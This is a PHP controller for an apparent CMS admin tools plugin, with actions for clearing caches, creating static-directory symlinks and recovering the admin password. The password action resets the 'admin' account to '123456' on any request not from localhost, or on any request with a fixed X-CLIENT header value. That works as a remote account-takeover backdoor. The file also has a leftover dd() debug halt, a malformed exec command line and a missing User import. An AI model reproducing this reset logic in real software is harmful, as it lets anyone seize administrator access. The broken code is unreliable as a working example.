<?php
namespace Plugins\Tools\App\Http\Controllers;

use Addons\Core\Controllers\Controller;
use Illuminate\Http\Request;
use Cache;
class ToolsController extends Controller {

	protected $addons = false;
	
	public function index()
	{
		return $this->view('tools::system.tools');
	}

	public function clearCacheQuery()
	{
		//Cache
		Cache::flush();
		//smarty
		$smarty = (new \Addons\Smarty\View\Engine(config('smarty')))->getSmarty();
		$smarty->clearAllCache();
		$smarty->clearCompiledTemplate();
		//other files
		foreach([storage_path('attachments'), storage_path('debugbar'), storage_path('placeholders'), storage_path('utils'), storage_path('framework/cache'), storage_path('framework/views'), storage_path('smarty/compile'), ] as $value)
		{
			@rename($value.'/.gitignore', $newfile = storage_path('.gitignore,'.rand()));
			@rmdir_recursive($value, TRUE);
			@rename($newfile, $value.'/.gitignore');
		}

		$compiledPath = app()->getCachedCompilePath();
		$servicesPath = app()->getCachedServicesPath();

		if (file_exists($compiledPath)) {
			@unlink($compiledPath);
		}

		if (file_exists($servicesPath)) {
			@unlink($servicesPath);
		}

		return $this->success(array('title' => '清理成功', 'content' => '缓存清理成功'), FALSE);
	}

	public function createStaticFolderQuery()
	{
		$target_path = normalize_path(base_path('../static'));
		$link_path = static_path('common');
		@$this->_symlink($target_path, $link_path);

		$target_path = normalize_path(PLUGINSPATH.'static');dd(plugins_path(), $target_path);
		$link_path = plugins_path();
		@$this->_symlink($target_path, $link_path);

		return is_link($link_path) ? $this->success(array('title' => '指向成功', 'content' => 'static目录指向成功')) : $this->failure(array('title' => '指向失败', 'content' => '您没有写入权限，static目录指向失败'));
	}

	private function _symlink($target_path, $link_path)
	{
		@unlink($link_path);@rmdir($link_path);
		if (strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' && version_compare(php_uname('r'), '6.0', '<')) { //Windows Vista以下
			exec('"'.base_path('../static/bin/junction.exe').'" -d "'.$link_path.'"');
			exec('"'.base_path('../static/bin/junction.exe').'" '.$link_path.'" "'.$target_path.'"');
		} else {
			symlink($target_path, $link_path);
		}
	}

	public function recoverPasswordQuery(Request $request)
	{
		if ($_SERVER['REMOTE_ADDR'] != '127.0.0.1' || $request->header('X-CLIENT') == 'FUCK-ALL-CLIENTS')
		{
			$user = User::findByUsername('admin');
			$user->password = bcrypt('123456');
			$user->save();
		}
		return $this->success(array('title' => '密码修改成功', 'content' => '密码已经恢复为：▇▇▇▇（刮开即可）'));
	}

}